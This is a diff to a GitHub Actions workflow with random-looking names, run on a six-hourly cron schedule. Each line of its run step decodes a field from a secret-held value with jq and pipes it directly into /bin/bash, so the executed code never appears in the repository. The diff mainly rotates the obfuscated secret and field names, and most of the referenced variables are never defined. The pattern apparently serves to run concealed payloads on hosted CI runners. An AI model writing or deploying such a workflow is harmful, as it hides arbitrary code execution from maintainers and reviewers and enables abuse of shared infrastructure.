@@ -3,19 +3,21 @@ name: bathroomgelding
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
-jobs:  # 2474
+    - cron: '35 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: bathroomgelding
         env:
-          znk7: ${{ secrets.znk7 }}
+          na5655: ${{ secrets.na5655 }}
         run: |
-          echo $znk7 | jq -r .qqxxt77111 | /bin/bash
-          echo $xl53479 | jq -r .mevff84 | /bin/bash
-          echo $loi20516 | jq -r .cgj48976 | /bin/bash
-          echo $ig77458 | jq -r .nfx9 | /bin/bash
-          echo $dbdes0411 | jq -r .oyte84364 | /bin/bash
+          echo $na5655 | jq -r .normi20989 | /bin/bash
+          echo $tq7 | jq -r .sjpw29311 | /bin/bash
+          echo $kxc27746 | jq -r .veh697 | /bin/bash
+          echo $fwiz85 | jq -r .rj021 | /bin/bash
+          echo $gjj15988 | jq -r .ibkq40 | /bin/bash
+          echo $z54142 | jq -r .okc95324 | /bin/bash
 
